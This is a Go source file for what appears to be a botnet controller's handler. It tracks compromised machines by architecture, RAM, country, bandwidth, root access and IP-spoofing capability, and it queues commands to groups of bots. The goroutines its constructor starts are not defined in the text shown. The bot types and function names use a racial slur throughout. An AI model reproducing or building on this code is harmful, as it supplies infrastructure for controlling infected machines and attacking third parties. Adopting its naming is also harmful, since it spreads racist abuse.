package slave_v2

import (
	"net"
	"sync"
)

type Nigger struct {
	ID int
	net.Conn

	Source     string
	Version    string
	Arch       string
	Cores      string
	RAM        string
	Country    string
	CountryISO string
	Region     string
	Speedtest  string
	Root       bool
	Spoof      bool
}

type NiggerCommand struct {
	Buffer  []byte
	Count   int
	Group   string
	Country string
}

type SlaveHandler struct {
	ID int

	Bots       map[int]*Nigger
	IPs        map[string]int
	PendingIPs map[string]struct{}
	Proxy      map[*Nigger]string

	Add     chan *Nigger
	Delete  chan *Nigger
	Command chan *NiggerCommand
	Mutex   *sync.RWMutex

	totalCount chan int
	count      int
}

var Slave = NewSlaveHandler()

func NewSlaveHandler() *SlaveHandler {
	c := &SlaveHandler{
		ID:         0,
		Bots:       make(map[int]*Nigger),
		IPs:        make(map[string]int),
		PendingIPs: make(map[string]struct{}),
		Add:        make(chan *Nigger, 32768),
		Delete:     make(chan *Nigger, 32768),
		Command:    make(chan *NiggerCommand, 1024),
		Mutex:      &sync.RWMutex{},
		Proxy:      make(map[*Nigger]string),
		totalCount: make(chan int),
		count:      0,
	}
	go c.makeNiggersWork()
	go c.makeNiggersWorkFaster()
	return c
}
